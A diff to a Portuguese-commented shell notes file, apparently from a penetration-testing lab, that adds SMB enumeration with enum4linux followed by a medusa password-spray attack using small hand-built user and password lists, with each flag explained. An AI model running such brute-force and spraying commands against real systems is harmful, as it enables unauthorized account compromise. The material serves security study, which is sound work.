@@ -30,4 +30,21 @@ medusa -h 192.168.0.105 -U users.txt -P pass.txt -M http \
 
 # Ataque a servidores SMB (compartilhamento do windows e linux) neste Ataque será uma senha para vários usuários
 # usando o Password Spray que pode descobrir senhas fracas
-enum4linux -a 192.168.56.102
+enum4linux -a 192.168.212.11 | tee enum4_output.txt # comando que enumera usando todas as técnicas possíveis
+# o ip especificado gravando em um arquivo txt as saídas desse ataque
+less enum4_output.txt  #visualiza o as informações do arquivo enum4_ouput.txt, preesione q para sair.
+
+# criar lista de alvo apartir dos usuários reais obtido pelo enum4
+echo -e "user\nmsfadmin\nservice" > smb_users.txt   # criando lista de usuários alimentado pelo 
+#arquivo smb_users.txt
+
+echo -e "password\n123456\nwelcome123\nmsfadmin" > senhas_spray.txt  #comando para criar wordlist de prováveis
+# senhas para ser usada com o medusa
+
+medusa -h 192.168.212.11 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50   #comando que tenata identificar 
+#credenciais válidas no serviço SMB do servidor 192.168.212.11, usando os dois arquivos de listas.
+# -U smb_users.txt	Carrega a lista de usuários.
+#-P senhas_spray.txt	Carrega a lista de senhas.
+#-M smbnt	Seleciona o módulo de autenticação SMB/NTLM.
+#-t 2	Executa até duas tentativas de autenticação em paralelo no host.
+#-T 50	Define um tempo limite de 50 segundos para o host.
